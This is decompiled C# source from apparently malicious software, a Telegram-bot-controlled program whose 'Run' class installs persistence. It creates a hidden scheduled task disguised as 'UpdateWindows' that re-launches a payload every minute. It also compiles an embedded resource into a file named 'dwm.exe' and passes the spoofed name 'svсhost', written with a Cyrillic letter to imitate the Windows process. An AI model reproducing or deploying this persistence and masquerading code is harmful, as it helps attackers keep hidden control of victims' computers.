using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using svchost.Properties;

namespace TelegramBot.Anti
{
	// Token: 0x02000103 RID: 259
	internal class Run
	{
		// Token: 0x06000372 RID: 882 RVA: 0x000276C8 File Offset: 0x000258C8
		public static void Autorun(string path)
		{
			string arguments = string.Concat(new string[]
			{
				"/create /tn UpdateWindows /tr \"",
				path,
				"\" /st ",
				DateTime.Now.AddMinutes(1.0).ToString("HH:mm"),
				" /du 9999:59 /sc daily /ri 1 /f"
			});
			Process.Start(new ProcessStartInfo
			{
				Arguments = arguments,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "schtasks.exe",
				RedirectStandardOutput = true,
				UseShellExecute = false
			}).WaitForExit();
		}

		// Token: 0x06000373 RID: 883 RVA: 0x00027760 File Offset: 0x00025960
		public static bool CFLcreate(string path)
		{
			bool result;
			try
			{
				Random random = new Random();
				path = path + "\\" + random.Next(345436, 6782436).ToString();
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				SharpCompiller.ExecuteScript(Resources.CFLcode.Replace("12345", Application.ExecutablePath).Replace("54321", "svсhost"), path + "\\dwm.exe", SharpCompiller.CFLcredit);
				Run.Autorun(path + "\\dwm.exe");
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
